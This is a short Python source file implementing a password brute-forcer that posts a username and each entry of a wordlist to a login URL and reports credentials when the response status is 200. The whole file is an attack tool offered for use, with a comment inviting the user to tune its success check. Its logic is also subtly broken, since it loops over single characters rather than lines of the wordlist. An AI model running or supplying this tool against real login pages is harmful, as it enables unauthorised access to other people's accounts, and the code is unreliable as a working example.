import requests
import os
import sys

v_val = False

class brute:
    def __init__(self, url, username, passwordlist, v_val):
        self.url = url
        self.username = username
        self.pwdlist = passwordlist
        self.v_val = v_val

    def logError(self, error):
        with open('error.txt', 'w') as file:
            file.writelines(str(error))

        with open('error.txt', 'r') as file:
            data = file.read()

            if data == error:
                print(f"[*] Error saved to: '{os.getcwd()}/error.txt'")
            else:
                print(f"[-] Error couldn't be saved, Printing error.")
                print(error)

    def start(self):
        self.v_val = True

        while self.v_val == True:
            with open(self.pwdlist, 'r') as list:
                data = list.read()
                for password in data:
                    if self.v_val != True:
                        sys.exit()
                    password = password.strip()

                    try:
                        r = requests.post(self.url, headers={
                            "username": str(self.username),
                            "password": str(password)
                        })

                        print(f"[*] Trying {self.username}:{password}\n")

                        """ 
                        ========================
                        =      INFORMATION     =
                        ========================
                        
                        Below you can change the if statement below to satisfy your bruteforcing needs to check if
                        The login was successful.
                        """
                        
                        if r.status_code == 200: # This part is what above is refering to.
                            print(f"[+] Found credentials: {self.username}:{password}\n\n")
                            sys.exit()
                        else:
                            print(f"[-] Invalid credentials: {self.username}:{password}\n\n")
                    except Exception as e:
                        brute.logError(self, e)

                break

    def stop(self):
        print("[-] Stopping bruteforcer.")
        self.v_val = False
